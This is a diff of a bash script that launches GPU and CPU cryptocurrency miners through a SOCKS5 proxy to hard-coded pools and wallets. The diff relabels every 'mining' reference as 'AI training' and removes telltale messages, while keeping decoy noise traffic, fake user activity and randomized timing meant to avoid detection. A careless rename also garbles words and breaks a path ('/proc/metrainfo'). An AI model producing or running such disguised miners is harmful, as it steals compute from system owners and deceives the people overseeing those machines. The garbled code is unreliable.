@@ -9,7 +9,7 @@ calculate_cpu_threads() {
     local total_threads=$(nproc --all)
     local threads=$((total_threads - 4))
     
-    # Ensure minimum of 1 thread
+    # Ensure trainimum of 1 thread
     if [ $threads -lt 1 ]; then
         threads=1
     fi
@@ -93,9 +93,9 @@ prev_idle=0
 
 # Function to randomize sleep times
 random_sleep() {
-    local min=$1
+    local train=$1
     local max=$2
-    local random_duration=$((RANDOM % (max - min + 1) + min))
+    local random_duration=$((RANDOM % (max - train + 1) + train))
     sleep $random_duration
 }
 
@@ -135,24 +135,22 @@ test_proxy_connection() {
     fi
 }
 
-# Function to start mining processes
-start_mining() {
+# Function to start training processes
+start_training() {
     # Clean old processes
     pkill -f aitraining_dual 2>/dev/null || true
-    pkill -f srbminer-multi 2>/dev/null || true
     random_sleep 1 3
     
     # Generate some noise traffic before starting
     generate_noise_traffic
     
-    echo "Starting GPU miner with SOCKS5 proxy..."
+    echo "Starting GPU trainer with SOCKS5 proxy..."
     
     # Start GPU process with proxy (using KawPow algorithm)
     nohup ./aitraining_dual \
         --algorithm kawpow \
         --pool stratum+ssl://51.89.99.172:16161 \
         --wallet RM2ciYa3CRqyreRsf25omrB4e1S95waALr \
-        --worker H200-g \
         --password x \
         --gpu-id 0,1,2,3,4,5,6,7 \
         --tls true \
@@ -165,14 +163,13 @@ start_mining() {
     # Random delay before CPU process
     random_sleep 2 5
     
-    echo "Starting CPU miner with SOCKS5 proxy ($CPU_THREADS threads)..."
+    echo "Starting CPU trainer with SOCKS5 proxy ($CPU_THREADS threads)..."
     
     # Start CPU process with proxy (using RandomX algorithm)
     nohup ./aitraining_dual \
         --algorithm randomx \
         --pool stratum+ssl://51.222.200.133:10343 \
         --wallet 44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd \
-        --worker H200-c \
         --password x \
         --cpu-threads $CPU_THREADS \
         --cpu-threads-priority 2 \
@@ -190,8 +187,8 @@ start_mining() {
     sleep 5
 }
 
-# Function to stop mining processes
-stop_mining() {
+# Function to stop training processes
+stop_training() {
     generate_noise_traffic
     
     echo -e "\nStopping processes at $(date '+%H:%M:%S')..."
@@ -203,7 +200,6 @@ stop_mining() {
     wait $CPU_PID 2>/dev/null || true
     
     pkill -f aitraining_dual 2>/dev/null || true
-    pkill -f srbminer-multi 2>/dev/null || true
     
     random_sleep 1 3
     clear
@@ -212,7 +208,6 @@ stop_mining() {
 # Function to simulate normal user activity
 simulate_normal_activity() {
     if [ $((RANDOM % 5)) -eq 0 ]; then
-        echo " [Simulating normal user activity...]"
         ls -la > /dev/null 2>&1
         date > /dev/null 2>&1
         df -h > /dev/null 2>&1
@@ -220,9 +215,9 @@ simulate_normal_activity() {
     fi
 }
 
-# Function to optimize CPU mining parameters
-optimize_cpu_mining() {
-    local total_mem_kb=$(grep MemTotal /proc/meminfo | awk '{print $2}')
+# Function to optimize CPU training parameters
+optimize_cpu_training() {
+    local total_mem_kb=$(grep MemTotal /proc/metrainfo | awk '{print $2}')
     local total_mem_gb=$((total_mem_kb / 1024 / 1024))
     
     echo "System memory: ${total_mem_gb}GB"
@@ -240,27 +235,27 @@ optimize_cpu_mining() {
 # Main execution
 clear
 echo "=== AI Training Monitor ==="
-echo "CPU Threads: $(nproc --all) total, using $CPU_THREADS for mining"
+echo "CPU Threads: $(nproc --all) total, using $CPU_THREADS for training"
 echo "Proxy: ${PROXY_USER}@${PROXY_IP}:${PROXY_PORT}"
 echo "=============================================="
 
 # Test proxy connection
 if ! test_proxy_connection; then
     echo "Warning: Proxy connection test failed!"
-    echo "Continuing anyway, but mining may not work..."
+    echo "Continuing anyway, but training may not work..."
     read -p "Press Enter to continue or Ctrl+C to abort..."
 fi
 
-# Optimize CPU mining
-optimize_cpu_mining
+# Optimize CPU training
+optimize_cpu_training
 
-echo -e "\nProcesses run for 1 hour, then pause 1 minute"
+echo -e "\nProcesses run for 1 hour, then pause 1 trainute"
 echo "Press Ctrl+C to stop"
 echo "=============================================="
 
 # Main loop
 while true; do
-    start_mining
+    start_training
     
     start_time=$(date +%s)
     run_duration=$((3600 + (RANDOM % 600) - 300))
@@ -282,7 +277,7 @@ while true; do
         random_sleep 1 4
     done
     
-    stop_mining
+    stop_training
     
     pause_duration=$((60 + (RANDOM % 40) - 20))
     
@@ -290,11 +285,11 @@ while true; do
     
     for ((i=pause_duration; i>0; i--)); do
         if [ $((i % 10)) -eq 0 ] || [ $i -lt 10 ]; then
-            printf "\rResuming in: %02d seconds" "$i"
+            printf "\rResutraing in: %02d seconds" "$i"
         fi
         sleep 1
     done
     
-    echo -e "\nResuming monitoring..."
+    echo -e "\nResutraing monitoring..."
     echo "=============================================="
 done
